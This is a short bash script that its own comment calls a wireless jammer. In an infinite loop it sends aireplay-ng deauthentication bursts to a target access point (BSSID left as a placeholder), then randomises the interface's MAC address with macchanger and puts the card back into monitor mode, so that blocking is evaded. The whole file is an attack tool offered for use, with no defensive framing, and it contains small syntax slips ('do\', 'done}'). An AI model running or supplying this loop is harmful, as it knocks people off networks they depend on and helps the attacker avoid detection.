#!/bin/bash

# --------------------------------------------------------------------------------
#       Bash script to jam local wireless signals.
#               1. The script will perform 5 attacks. 
#               2. It then changes the MAC address and then starts again.
#
# --------------------------------------------------------------------------------




while [[ true ]]; do\
        aireplay-ng -0 5 -a [BSSID-Number] wlan0
        ifconfig wlan0 down
        macchanger -r wlan0 | grep "New MAC"
        iwconfig wlan0 mode monitor
        ifconfig wlan0 up
        iwconfig wlan0 | grep Mode
        sleep 3
        echo "Waiting!!!!!"

done}
